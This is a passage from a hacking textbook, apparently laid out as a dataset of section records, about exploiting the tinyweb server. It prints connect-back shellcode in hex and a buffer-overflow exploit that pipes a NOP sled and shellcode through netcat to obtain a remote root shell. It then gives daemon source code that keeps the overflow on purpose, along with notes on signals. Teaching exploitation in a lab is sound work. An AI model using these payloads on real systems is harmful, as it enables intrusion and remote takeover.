0x48\n(gdb) p /x 31337\n$5 = 0x7a69\n(gdb)\nShellcode 315\nSince these values are stored in network byte order but the x86 archi-\ntecture is in little-endian order, the stored DWORD seems to be reversed. This\nmeans the DWORD for 192.168.42.72 is 0x482aa8c0. This also applies for the\ntwo-byte WORD used for the destination port. When the port number 31337\nis printed in hexadecimal using gdb, the byte order is shown in little-endian\norder. This means the displayed bytes must be reversed, so WORD for 31337\nis 0x697a.\nThe netcat program can also be used to listen for incoming connections\nwith the -l command-line option. This is used in the output below to listen\non port 31337 for the connect-back shellcode. The ifconfig command ensures\nthe IP address of eth0 is 192.168.42.72 so the shellcode can connect back to it.\nreader@hacking:~/booksrc $ sudo ifconfig eth0 192.168.42.72 up\nreader@hacking:~/booksrc $ ifconfig eth0\neth0 Link encap:Ethernet HWaddr 00:01:6C:EB:1D:50\ninet addr:192.168.42.72 Bcast:192.168.42.255 Mask:255.255.255.0\nUP BROADCAST MULTICAST MTU:1500 Metric:1\nRX packets:0 errors:0 dropped:0 overruns:0 frame:0\nTX packets:0 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:0 (0.0 b) TX bytes:0 (0.0 b)\nInterrupt:16\nreader@hacking:~/booksrc $ nc -v -l -p 31337\nlistening on [any] 31337 ...\nNow, let’s try to exploit the tinyweb server program using the connect-\nback shellcode. From working with this program before, we know that the\nrequest buffer is 500 bytes long and is located at 0xbffff5c0 in stack memory.\nWe also know that the return address is found within 40 bytes of the end of\nthe buffer.\nreader@hacking:~/booksrc $ nasm connectback_shell.s\nreader@hacking:~/booksrc $ hexdump -C connectback_shell\n00000000 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.....|\n00000010 96 6a 66 58 43 68 c0 a8 2a 48 66 68 7a 69 66 53 |.jfXCh..*HfhzifS|\n00000020 89 e1 6a 10 51 56 89 e1 43 cd 80 87 f3 87 ce 49 |..j.QV..C......I|\n00000030 b0 3f cd 80 49 79 f9 b0 0b 52 68 2f 2f 73 68 68 |.?..Iy...Rh//shh|\n00000040 2f 62 69 6e 89 e3 52 89 e2 53 89 e1 cd 80 |/bin..R..S....|\n0000004e\nreader@hacking:~/booksrc $ wc -c connectback_shell\n78 connectback_shell\nreader@hacking:~/booksrc $ echo $(( 544 - (4*16) - 78 ))\n402\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p /x 0xbffff5c0 + 200\"\n$1 = 0xbffff688\nreader@hacking:~/booksrc $\nSince the offset from the beginning of the buffer to the return address is\n540 bytes, a total of 544 bytes must be written to overwrite the four-byte return\naddress. The return address overwrite also needs to be properly aligned, since\n316 0x500\nthe return address uses multiple bytes. To ensure proper alignment, the sum\nof the NOP sled and shellcode bytes must be divisible by four. In addition, the\nshellcode itself must stay within the first 500 bytes of the overwrite. These are\nthe bounds of the response buffer, and the memory afterward corresponds\nto other values on the stack that might be written to before we change the\nprogram’s control flow. Staying within these bounds avoids the risk of random\noverwrites to the shellcode, which inevitably lead to crashes. Repeating the\nreturn address 16 times will generate 64 bytes, which can be put at the end of\nthe 544-byte exploit buffer and keeps the shellcode safely within the bounds\nof the buffer. The remaining bytes at the beginning of the exploit buffer will\nbe the NOP sled. The calculations above show that a 402-byte NOP sled will\nproperly align the 78-byte shellcode and place it safely within the bounds of\nthe buffer. Repeating the desired return address 12 times spaces the final\n4bytes of the exploit buffer perfectly to overwrite the saved return address\non the stack. Overwriting the return address with 0xbffff688 should return\nexecution right to the middle of the NOP sled, while avoiding bytes near the\nbeginning of the buffer, which might get mangled. These calculated values\nwill be used in the following exploit, but first the connect-back shell needs\nsome place to connect back to. In the output below, netcat is used to listen\nfor incoming connections on port 31337.\nreader@hacking:~/booksrc $ nc -v -l -p 31337\nlistening on [any] 31337 ...\nNow, in another terminal, the calculated exploit values can be used to\nexploit the tinyweb program remotely.\nFrom Another Terminal Window\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x402';\n> cat connectback_shell;\n> perl -e 'print \"\\x88\\xf6\\xff\\xbf\"x20 . \"\\r\\n\"') | nc -v 127.0.0.1 80\nlocalhost [127.0.0.1] 80 (www) open\nBack in the original terminal, the shellcode has connected back to\nthenetcat process listening on port 31337. This provides root shell access\nremotely.\nreader@hacking:~/booksrc $ nc -v -l -p 31337\nlistening on [any] 31337 ...\nconnect to [192.168.42.72] from hacking.local [192.168.42.72] 34391\nwhoami\nroot\nThe network configuration for this example is slightly confusing\nbecause the attack is directed at 127.0.0.1 and the shellcode connects back\nto192.168.42.72. Both of these IP addresses route to the same place, but\n192.168.42.72 is easier to use in shellcode than 127.0.0.1. Since the loopback\naddress contains two null bytes, the address must be built on the stack with\nShellcode 317\nmultiple instructions. One way to do this is to write the two null bytes to\nthestack using a zeroed register. The file loopback_shell.s is a modified\nversion of connectback_shell.s that uses the loopback address of 127.0.0.1.\nThe differences are shown in the following output.\nreader@hacking:~/booksrc $ diff connectback_shell.s loopback_shell.s\n21c21,22\n< push DWORD 0x482aa8c0 ; Build sockaddr struct: IP Address = 192.168.42.72\n---\n> push DWORD 0x01BBBB7f ; Build sockaddr struct: IP Address = 127.0.0.1\n> mov WORD [esp+1], dx ; overwrite the BBBB with 0000 in the previous push\nreader@hacking:~/booksrc $\nAfter pushing the value 0x01BBBB7f to the stack, the ESP register will point\nto the beginning of this DWORD. By writing a two-byte WORD of null bytes\nat ESP+1, the middle two bytes will be overwritten to form the correct return\naddress.\nThis additional instruction increases the size of the shellcode by a few\nbytes, which means the NOP sled also needs to be adjusted for the exploit\nbuffer. These calculations are shown in the output below, and they result in\na397-byte NOP sled. This exploit using the loopback shellcode assumes that\nthe tinyweb program is running and that a netcat process is listening for\nincoming connections on port 31337.\nreader@hacking:~/booksrc $ nasm loopback_shell.s\nreader@hacking:~/booksrc $ hexdump -C loopback_shell | grep --color=auto 00\n00000000 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.....|\n00000010 96 6a 66 58 43 68 7f bb bb 01 66 89 54 24 01 66 |.jfXCh....f.T$.f|\n00000020 68 7a 69 66 53 89 e1 6a 10 51 56 89 e1 43 cd 80 |hzifS..j.QV..C..|\n00000030 87 f3 87 ce 49 b0 3f cd 80 49 79 f9 b0 0b 52 68 |....I.?..Iy...Rh|\n00000040 2f 2f 73 68 68 2f 62 69 6e 89 e3 52 89 e2 53 89 |//shh/bin..R..S.|\n00000050 e1 cd 80 |...|\n00000053\nreader@hacking:~/booksrc $ wc -c loopback_shell\n83 loopback_shell\nreader@hacking:~/booksrc $ echo $(( 544 - (4*16) - 83 ))\n397\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x397';cat loopback_shell;perl -e 'print \"\\x88\\\nxf6\\xff\\xbf\"x16 . \"\\r\\n\"') | nc -v 127.0.0.1 80\nlocalhost [127.0.0.1] 80 (www) open\nAs with the previous exploit, the terminal with netcat listening on\nport31337 will receive the rootshell.\nreader@hacking:~ $ nc -vlp 31337\nlistening on [any] 31337 ...\nconnect to [127.0.0.1] from localhost [127.0.0.1] 42406\nwhoami\nroot\nIt almost seems too easy, doesn’t it?\n318 0x500"
  },
  {
    "input": "0x600: Countermeasures",
    "output": "0x600\nC O U N T E R M E A S U R E S\nThe golden poison dart frog secretes an extremely\ntoxic poison—one frog can emit enough to kill 10\nadult humans. The only reason these frogs have such\nan amazingly powerful defense is that a certain species\nof snake kept eating them and developing a resistance.\nIn response, the frogs kept evolving stronger and stronger poisons as a\ndefense. One result of this co-evolution is that the frogs are safe against all\nother predators. This type of co-evolution also happens with hackers. Their\nexploit techniques have been around for years, so it’s only natural that\ndefensive countermeasures would develop. In response, hackers find ways\nto bypass and subvert these defenses, and then new defense techniques are\ncreated.\nThis cycle of innovation is actually quite beneficial. Even though viruses\nand worms can cause quite a bit of trouble and costly interruptions for busi-\nnesses, they force a response, which fixes the problem. Worms replicate by\nexploiting existing vulnerabilities in flawed software. Often these flaws are\nundiscovered for years, but relatively benign worms such as CodeRed or Sasser\nforce these problems to be fixed. As with chickenpox, it’s better to suffer a"
  },
  {
    "input": "0x610 Countermeasures That Detect",
    "output": "minor outbreak early instead of years later when it can cause real damage.\nIf it weren’t for Internet worms making a public spectacle of these security\nflaws, they might remain unpatched, leaving us vulnerable to an attack from\nsomeone with more malicious goals than just replication. In this way, worms\nand viruses can actually strengthen security in the long run. However, there\nare more proactive ways to strengthen security. Defensive countermeasures\nexist which try to nullify the effect of an attack, or prevent the attack from\nhappening. A countermeasure is a fairly abstract concept; this could be a\nsecurity product, a set of policies, a program, or simply just an attentive system\nadministrator. These defensive countermeasures can be separated into two\ngroups: those that try to detect the attack and those that try to protect the\nvulnerability.\n0x610 Countermeasures That Detect\nThe first group of countermeasures tries to detect the intrusion and respond\nin some way. The detection process could be anything from an administrator\nreading logs to a program sniffing the network. The response might include\nkilling the connection or process automatically, or just the administrator\nscrutinizing everything from the machine’s console.\nAs a system administrator, the exploits you know about aren’t nearly as\ndangerous as the ones you don’t. The sooner an intrusion is detected, the\nsooner it can be dealt with and the more likely it can be contained. Intrusions\nthat aren’t discovered for months can be cause for concern.\nThe way to detect an intrusion is to anticipate what the attacking hacker\nis going to do. If you know that, then you know what to look for. Counter-\nmeasures that detect can look for these attack patterns in log files, network\npackets, or even program memory. After an intrusion is detected, the hacker\ncan be expunged from the system, any filesystem damage can be undone by\nrestoring from backup, and the exploited vulnerability can be identified and\npatched. Detecting countermeasures are quite powerful in an electronic\nworld with backup and restore capabilities.\nFor the attacker, this means detection can counteract everything he does.\nSince the detection might not always be immediate, there are a few “smash\nand grab” scenarios where it doesn’t matter; however, even then it’s better\nnot to leave tracks. Stealth is one of the hacker’s most valuable assets. Exploit-\ning a vulnerable program to get a root shell means you can do whatever you\nwant on that system, but avoiding detection additionally means no one knows\nyou’re there. The combination of “God mode” and invisibility makes for a\ndangerous hacker. From a concealed position, passwords and data can be\nquietly sniffed from the network, programs can be backdoored, and further\nattacks can be launched on other hosts. To stay hidden, you simply need to\nanticipate the detection methods that might be used. If you know what they\nare looking for, you can avoid certain exploit patterns or mimic valid ones.\nThe co-evolutionary cycle between hiding and detecting is fueled by thinking\nof the things the other side hasn’t thought of.\n320 0x600"
  },
  {
    "input": "0x620 System Daemons",
    "output": "0x620 System Daemons\nTo have a realistic discussion of exploit countermeasures and bypass methods,\nwe first need a realistic exploitation target. A remote target will be a server\nprogram that accepts incoming connections. In Unix, these programs are\nusually system daemons. A daemon is a program that runs in the back-\nground and detaches from the controlling terminal in a certain way. The\nterm daemon was first coined by MIT hackers in the 1960s. It refers to a\nmolecule-sorting demon from an 1867 thought experiment by a physicist\nnamed James Maxwell. In the thought experiment, Maxwell’s demon is a\nbeing with the supernatural ability to effortlessly perform difficult tasks,\napparently violating the second law of thermodynamics. Similarly, in Linux,\nsystem daemons tirelessly perform tasks such as providing SSH service and\nkeeping system logs. Daemon programs typically end with a d to signify they\nare daemons, such as sshd or syslogd.\nWith a few additions, the tinyweb.c code on page 214 can be made into a\nmore realistic system daemon. This new code uses a call to the daemon() func-\ntion, which will spawn a new background process. This function is used by\nmany system daemon processes in Linux, and its man page is shown below.\nDAEMON(3) Linux Programmer's Manual DAEMON(3)\nNAME\ndaemon - run in the background\nSYNOPSIS\n#include <unistd.h>\nint daemon(int nochdir, int noclose);\nDESCRIPTION\nThe daemon() function is for programs wishing to detach themselves from\nthe controlling terminal and run in the background as system daemons.\nUnless the argument nochdir is non-zero, daemon() changes the current\nworking directory to the root (\"/\").\nUnless the argument noclose is non-zero, daemon() will redirect stan\ndard input, standard output and standard error to /dev/null.\nRETURN VALUE\n(This function forks, and if the fork() succeeds, the parent does\n_exit(0), so that further errors are seen by the child only.) On suc\ncess zero will be returned. If an error occurs, daemon() returns -1\nand sets the global variable errno to any of the errors specified for\nthe library functions fork(2) and setsid(2).\nCountermeasures 321"
  },
  {
    "input": "0x621 Crash Course in Signals",
    "output": "System daemons run detached from a controlling terminal, so the new\ntinyweb daemon code writes to a log file. Without a controlling terminal,\nsystem daemons are typically controlled with signals. The new tinyweb\ndaemon program will need to catch the terminate signal so it can exit\ncleanly when killed.\n0x621 Crash Course in Signals\nSignals provide a method of interprocess communication in Unix. When a\nprocess receives a signal, its flow of execution is interrupted by the operating\nsystem to call a signal handler. Signals are identified by a number, and each\none has a default signal handler. For example, when CTRL-C is typed in a\nprogram’s controlling terminal, an interrupt signal is sent, which has a default\nsignal handler that exits the program. This allows the program to be inter-\nrupted, even if it is stuck in an infinite loop.\nCustom signal handlers can be registered using the signal() function.\nIn the example code below, several signal handlers are registered for certain\nsignals, whereas the main code contains an infinite loop.\nsignal_example.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <signal.h>\n/* Some labeled signal defines from signal.h\n* #define SIGHUP 1 Hangup\n* #define SIGINT 2 Interrupt (Ctrl-C)\n* #define SIGQUIT 3 Quit (Ctrl-\\)\n* #define SIGILL 4 Illegal instruction\n* #define SIGTRAP 5 Trace/breakpoint trap\n* #define SIGABRT 6 Process aborted\n* #define SIGBUS 7 Bus error\n* #define SIGFPE 8 Floating point error\n* #define SIGKILL 9 Kill\n* #define SIGUSR1 10 User defined signal 1\n* #define SIGSEGV 11 Segmentation fault\n* #define SIGUSR2 12 User defined signal 2\n* #define SIGPIPE 13 Write to pipe with no one reading\n* #define SIGALRM 14 Countdown alarm set by alarm()\n* #define SIGTERM 15 Termination (sent by kill command)\n* #define SIGCHLD 17 Child process signal\n* #define SIGCONT 18 Continue if stopped\n* #define SIGSTOP 19 Stop (pause execution)\n* #define SIGTSTP 20 Terminal stop [suspend] (Ctrl-Z)\n* #define SIGTTIN 21 Background process trying to read stdin\n* #define SIGTTOU 22 Background process trying to read stdout\n*/\n/* A signal handler */\nvoid signal_handler(int signal) {\n322 0x600\nprintf(\"Caught signal %d\\t\", signal);\nif (signal == SIGTSTP)\nprintf(\"SIGTSTP (Ctrl-Z)\");\nelse if (signal == SIGQUIT)\nprintf(\"SIGQUIT (Ctrl-\\\\)\");\nelse if (signal == SIGUSR1)\nprintf(\"SIGUSR1\");\nelse if (signal == SIGUSR2)\nprintf(\"SIGUSR2\");\nprintf(\"\\n\");\n}\nvoid sigint_handler(int x) {\nprintf(\"Caught a Ctrl-C (SIGINT) in a separate handler\\nExiting.\\n\");\nexit(0);\n}\nint main() {\n/* Registering signal handlers */\nsignal(SIGQUIT, signal_handler); // Set signal_handler() as the\nsignal(SIGTSTP, signal_handler); // signal handler for these\nsignal(SIGUSR1, signal_handler); // signals.\nsignal(SIGUSR2, signal_handler);\nsignal(SIGINT, sigint_handler); // Set sigint_handler() for SIGINT.\nwhile(1) {} // Loop forever.\n}\nWhen this program is compiled and executed, signal handlers are\nregistered, and the program enters an infinite loop. Even though the program\nis stuck looping, incoming signals will interrupt execution and call the\nregistered signal handlers. In the output below, signals that can be triggered\nfrom the controlling terminal are used. The signal_handler() function,\nwhen finished, returns execution back into the interrupted loop, whereas\nthe sigint_handler() function exits the program.\nreader@hacking:~/booksrc $ gcc -o signal_example signal_example.c\nreader@hacking:~/booksrc $ ./signal_example\nCaught signal 20 SIGTSTP (Ctrl-Z)\nCaught signal 3 SIGQUIT (Ctrl-\\)\nCaught a Ctrl-C (SIGINT) in a separate handler\nExiting.\nreader@hacking:~/booksrc $\nSpecific signals can be sent to a process using the kill command. By\ndefault, the kill command sends the terminate signal (SIGTERM) to a process.\nWith the -l command-line switch, kill lists all the possible signals. In the\noutput below, the SIGUSR1 and SIGUSR2 signals are sent to the signal_example\nprogram being executed in another terminal.\nCountermeasures 323"
  },
  {
    "input": "0x622 Tinyweb Daemon",
    "output": "reader@hacking:~/booksrc $ kill -l\n1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL\n5) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE\n9) SIGKILL 10) SIGUSR1 11) SIGSEGV 12) SIGUSR2\n13) SIGPIPE 14) SIGALRM 15) SIGTERM 16) SIGSTKFLT\n17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP\n21) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU\n25) SIGXFSZ 26) SIGVTALRM 27) SIGPROF 28) SIGWINCH\n29) SIGIO 30) SIGPWR 31) SIGSYS 34) SIGRTMIN\n35) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3 38) SIGRTMIN+4\n39) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+8\n43) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12\n47) SIGRTMIN+13 48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14\n51) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-10\n55) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7 58) SIGRTMAX-6\n59) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-2\n63) SIGRTMAX-1 64) SIGRTMAX\nreader@hacking:~/booksrc $ ps a | grep signal_example\n24491 pts/3 R+ 0:17 ./signal_example\n24512 pts/1 S+ 0:00 grep signal_example\nreader@hacking:~/booksrc $ kill -10 24491\nreader@hacking:~/booksrc $ kill -12 24491\nreader@hacking:~/booksrc $ kill -9 24491\nreader@hacking:~/booksrc $\nFinally, the SIGKILL signal is sent using kill -9. This signal’s handler\ncannot be changed, so kill -9 can always be used to kill processes. In the\nother terminal, the running signal_example shows the signals as they are\ncaught and the process is killed.\nreader@hacking:~/booksrc $ ./signal_example\nCaught signal 10 SIGUSR1\nCaught signal 12 SIGUSR2\nKilled\nreader@hacking:~/booksrc $\nSignals themselves are pretty simple; however, interprocess communica-\ntion can quickly become a complex web of dependencies. Fortunately, in the\nnew tinyweb daemon, signals are only used for clean termination, so the\nimplementation is simple.\n0x622 Tinyweb Daemon\nThis newer version of the tinyweb program is a system daemon that runs in\nthe background without a controlling terminal. It writes its output to a log\nfile with timestamps, and it listens for the terminate (SIGTERM) signal so it\ncan shut down cleanly when it’s killed.\nThese additions are fairly minor, but they provide a much more realistic\nexploit target. The new portions of the code are shown in bold in the listing\nbelow.\n324 0x600\ntinywebd.c\n#include <sys/stat.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <time.h>\n#include <signal.h>\n#include \"hacking.h\"\n#include \"hacking-network.h\"\n#define PORT 80 // The port users will be connecting to\n#define WEBROOT \"./webroot\" // The webserver's root directory\n#define LOGFILE \"/var/log/tinywebd.log\" // Log filename\nint logfd, sockfd; // Global log and socket file descriptors\nvoid handle_connection(int, struct sockaddr_in *, int);\nint get_file_size(int); // Returns the file size of open file descriptor\nvoid timestamp(int); // Writes a timestamp to the open file descriptor\n// This function is called when the process is killed.\nvoid handle_shutdown(int signal) {\ntimestamp(logfd);\nwrite(logfd, \"Shutting down.\\n\", 16);\nclose(logfd);\nclose(sockfd);\nexit(0);\n}\nint main(void) {\nint new_sockfd, yes=1;\nstruct sockaddr_in host_addr, client_addr; // My address information\nsocklen_t sin_size;\nlogfd = open(LOGFILE, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\nif(logfd == -1)\nfatal(\"opening log file\");\nif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\nfatal(\"in socket\");\nif (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\nfatal(\"setting socket option SO_REUSEADDR\");\nprintf(\"Starting tiny web daemon.\\n\");\nif(daemon(1, 0) == -1) // Fork to a background daemon process.\nfatal(\"forking to daemon process\");\nsignal(SIGTERM, handle_shutdown); // Call handle_shutdown when killed.\nsignal(SIGINT, handle_shutdown); // Call handle_shutdown when interrupted.\ntimestamp(logfd);\nCountermeasures 325\nwrite(logfd, \"Starting up.\\n\", 15);\nhost_addr.sin_family = AF_INET; // Host byte order\nhost_addr.sin_port = htons(PORT); // Short, network byte order\nhost_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\nmemset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nif (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\nfatal(\"binding to socket\");\nif (listen(sockfd, 20) == -1)\nfatal(\"listening on socket\");\nwhile(1) { // Accept loop.\nsin_size = sizeof(struct sockaddr_in);\nnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\nif(new_sockfd == -1)\nfatal(\"accepting connection\");\nhandle_connection(new_sockfd, &client_addr, logfd);\n}\nreturn 0;\n}\n/* This function handles the connection on the passed socket from the\n* passed client address and logs to the passed FD. The connection is\n* processed as a web request and this function replies over the connected\n* socket. Finally, the passed socket is closed at the end of the function.\n*/\nvoid handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\nunsigned char *ptr, request[500], resource[500], log_buffer[500];\nint fd, length;\nlength = recv_line(sockfd, request);\nsprintf(log_buffer, \"From %s:%d \\\"%s\\\"\\t\", inet_ntoa(client_addr_ptr->sin_addr),\nntohs(client_addr_ptr->sin_port), request);\nptr = strstr(request, \" HTTP/\"); // Search for valid-looking request.\nif(ptr == NULL) { // Then this isn't valid HTTP\nstrcat(log_buffer, \" NOT HTTP!\\n\");\n} else {\n*ptr = 0; // Terminate the buffer at the end of the URL.\nptr = NULL; // Set ptr to NULL (used to flag for an invalid request).\nif(strncmp(request, \"GET \", 4) == 0) // Get request\nptr = request+4; // ptr is the URL.\nif(strncmp(request, \"HEAD \", 5) == 0) // Head request\nptr = request+5; // ptr is the URL.\nif(ptr == NULL) { // Then this is not a recognized request\nstrcat(log_buffer, \" UNKNOWN REQUEST!\\n\");\n} else { // Valid request, with ptr pointing to the resource name\nif (ptr[strlen(ptr) - 1] == '/') // For resources ending with '/',\nstrcat(ptr, \"index.html\"); // add 'index.html' to the end.\nstrcpy(resource, WEBROOT); // Begin resource with web root path\nstrcat(resource, ptr); // and join it with resource path.\nfd = open(resource, O_RDONLY, 0); // Try to open the file.\n326 0x600\nif(fd == -1) { // If file is not found\nstrcat(log_buffer, \" 404 Not Found\\n\");\nsend_string(sockfd, \"HTTP/1.0 404 NOT FOUND\\r\\n\");\nsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\nsend_string(sockfd, \"<html><head><title>404 Not Found</title></head>\");\nsend_string(sockfd, \"<body><h1>URL not found</h1></body></html>\\r\\n\");\n} else { // Otherwise, serve up the file.\nstrcat(log_buffer, \" 200 OK\\n\");\nsend_string(sockfd, \"HTTP/1.0 200 OK\\r\\n\");\nsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\nif(ptr == request + 4) { // Then this is a GET request\nif( (length = get_file_size(fd)) == -1)\nfatal(\"getting resource file size\");\nif( (ptr = (unsigned char *) malloc(length)) == NULL)\nfatal(\"allocating memory for reading resource\");\nread(fd, ptr, length); // Read the file into memory.\nsend(sockfd, ptr, length, 0); // Send it to socket.\nfree(ptr); // Free file memory.\n}\nclose(fd); // Close the file.\n} // End if block for file found/not found.\n} // End if block for valid request.\n} // End if block for valid HTTP.\ntimestamp(logfd);\nlength = strlen(log_buffer);\nwrite(logfd, log_buffer, length); // Write to the log.\nshutdown(sockfd, SHUT_RDWR); // Close the socket gracefully.\n}\n/* This function accepts an open file descriptor and returns\n* the size of the associated file. Returns -1 on failure.\n*/\nint get_file_size(int fd) {\nstruct stat stat_struct;\nif(fstat(fd, &stat_struct) == -1)\nreturn -1;\nreturn (int) stat_struct.st_size;\n}\n/* This function writes a timestamp string to the open file descriptor\n* passed to it.\n*/\nvoid timestamp(fd) {\ntime_t now;\nstruct tm *time_struct;\nint length;\nchar time_buffer[40];\ntime(&now); // Get number of seconds since epoch.\ntime_struct = localtime((const time_t *)&now); // Convert to tm struct.\nlength = strftime(time_buffer, 40, \"%m/%d/%Y %H:%M:%S> \", time_struct);\nwrite(fd, time_buffer, length); // Write timestamp string to log.\n}\nCountermeasures 327"
  },
  {
    "input": "0x630 Tools of the Trade",
    "output": "This daemon program forks into the background, writes to a log file with\ntimestamps, and cleanly exits when it is killed. The log file descriptor and\nconnection-receiving socket are declared as globals so they can be closed\ncleanly by the handle_shutdown() function. This function is set up as the callback\nhandler for the terminate and interrupt signals, which allows the program to\nexit gracefully when it’s killed with the kill command.\nThe output below shows the program compiled, executed, and killed.\nNotice that the log file contains timestamps as well as the shutdown message\nwhen the program catches the terminate signal and calls handle_shutdown()\nto exit gracefully.\nreader@hacking:~/booksrc $ gcc -o tinywebd tinywebd.c\nreader@hacking:~/booksrc $ sudo chown root ./tinywebd\nreader@hacking:~/booksrc $ sudo chmod u+s ./tinywebd\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ ./webserver_id 127.0.0.1\nThe web server for 127.0.0.1 is Tiny webserver\nreader@hacking:~/booksrc $ ps ax | grep tinywebd\n25058 ? Ss 0:00 ./tinywebd\n25075 pts/3 R+ 0:00 grep tinywebd\nreader@hacking:~/booksrc $ kill 25058\nreader@hacking:~/booksrc $ ps ax | grep tinywebd\n25121 pts/3 R+ 0:00 grep tinywebd\nreader@hacking:~/booksrc $ cat /var/log/tinywebd.log\ncat: /var/log/tinywebd.log: Permission denied\nreader@hacking:~/booksrc $ sudo cat /var/log/tinywebd.log\n07/22/2007 17:55:45> Starting up.\n07/22/2007 17:57:00> From 127.0.0.1:38127 \"HEAD / HTTP/1.0\" 200 OK\n07/22/2007 17:57:21> Shutting down.\nreader@hacking:~/booksrc $\nThis tinywebd program serves HTTP content just like the original tinyweb\nprogram, but it behaves as a system daemon, detaching from the controlling\nterminal and writing to a log file. Both programs are vulnerable to the same\noverflow exploit; however, the exploitation is only the beginning. Using the\nnew tinyweb daemon as a more realistic exploit target, you will learn how to\navoid detection after the intrusion.\n0x630 Tools of the Trade\nWith a realistic target in place, let’s jump back over to the attacker’s side of\nthe fence. For this kind of attack, exploit scripts are an essential tool of the\ntrade. Like a set of lock picks in the hands of a professional, exploits open\nmany doors for a hacker. Through careful manipulation of the internal\nmechanisms, the security can be entirely sidestepped.\n328 0x600"
  },
  {
    "input": "0x631 tinywebd Exploit Tool",
    "output": "In previous chapters, we’ve written exploit code in C and manually\nexploited vulnerabilities from the command line. The fine line between\nanexploit program and an exploit tool is a matter of finalization and recon-\nfigurability. Exploit programs are more like guns than tools. Like a gun, an\nexploit program has a singular utility and the user interface is as simple as\npulling a trigger. Both guns and exploit programs are finalized products that\ncan be used by unskilled people with dangerous results. In contrast, exploit\ntools usually aren’t finished products, nor are they meant for others to use.\nWith an understanding of programming, it’s only natural that a hacker would\nbegin to write his own scripts and tools to aid exploitation. These personalized\ntools automate tedious tasks and facilitate experimentation. Like conventional\ntools, they can be used for many purposes, extending the skill of the user.\n0x631 tinywebd Exploit Tool\nFor the tinyweb daemon, we want an exploit tool that allows us to experiment\nwith the vulnerabilities. As in the development of our previous exploits,\nGDB is used first to figure out the details of the vulnerability, such as offsets.\nThe offset to the return address will be the same as in the original tinyweb.c\nprogram, but a daemon program presents added challenges. The daemon\ncall forks the process, running the rest of the program in the child process,\nwhile the parent process exits. In the output below, a breakpoint is set after\nthe daemon() call, but the debugger never hits it.\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q ./a.out\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 47\n42\n43 if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\n44 fatal(\"setting socket option SO_REUSEADDR\");\n45\n46 printf(\"Starting tiny web daemon.\\n\");\n47 if(daemon(1, 1) == -1) // Fork to a background daemon process.\n48 fatal(\"forking to daemon process\");\n49\n50 signal(SIGTERM, handle_shutdown); // Call handle_shutdown when killed.\n51 signal(SIGINT, handle_shutdown); // Call handle_shutdown when interrupted.\n(gdb) break 50\nBreakpoint 1 at 0x8048e84: file tinywebd.c, line 50.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nStarting tiny web daemon.\nProgram exited normally.\n(gdb)\nCountermeasures 329\nWhen the program is run, it just exits. In order to debug this program,\nGDB needs to be told to follow the child process, as opposed to following the\nparent. This is done by setting follow-fork-mode to child. After this change, the\ndebugger will follow execution into the child process, where the breakpoint\ncan be hit.\n(gdb) set follow-fork-mode child\n(gdb) help set follow-fork-mode\nSet debugger response to a program call of fork or vfork.\nA fork or vfork creates a new process. follow-fork-mode can be:\nparent - the original process is debugged after a fork\nchild - the new process is debugged after a fork\nThe unfollowed process will continue to run.\nBy default, the debugger will follow the parent process.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nStarting tiny web daemon.\n[Switching to process 1051]\nBreakpoint 1, main () at tinywebd.c:50\n50 signal(SIGTERM, handle_shutdown); // Call handle_shutdown when killed.\n(gdb) quit\nThe program is running. Exit anyway? (y or n) y\nreader@hacking:~/booksrc $ ps aux | grep a.out\nroot 911 0.0 0.0 1636 416 ? Ss 06:04 0:00 /home/reader/booksrc/a.out\nreader 1207 0.0 0.0 2880 748 pts/2 R+ 06:13 0:00 grep a.out\nreader@hacking:~/booksrc $ sudo kill 911\nreader@hacking:~/booksrc $\nIt’s good to know how to debug child processes, but since we need\nspecific stack values, it’s much cleaner and easier to attach to a running\nprocess. After killing any stray a.out processes, the tinyweb daemon is\nstarted back up and then attached to with GDB.\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web 